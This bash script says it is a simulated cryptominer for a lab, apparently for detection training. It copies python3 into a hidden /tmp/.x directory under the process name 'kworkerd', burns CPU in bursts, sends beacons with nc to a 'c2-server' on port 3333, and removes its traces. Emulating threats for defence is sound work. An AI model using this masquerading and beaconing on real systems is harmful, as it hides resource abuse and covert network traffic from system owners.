#!/bin/bash
# SIMULATED cryptominer (lab only): a renamed python process in /tmp burns CPU in short
# bursts and talks to a "pool" port on the lab C2 container. No real mining happens.
# Usage: miner.sh <seconds>
DUR=${1:-300}; END=$((SECONDS + DUR))
mkdir -p /tmp/.x && cp "$(command -v python3)" /tmp/.x/kworkerd && chmod +x /tmp/.x/kworkerd
while [ $SECONDS -lt $END ]; do
  /tmp/.x/kworkerd -c "import time; t=time.time()
while time.time()-t < 3: pass"
  echo "share $(hostname) $RANDOM" | nc -w 1 c2-server 3333 > /dev/null 2>&1
  sleep 1
done
rm -rf /tmp/.x
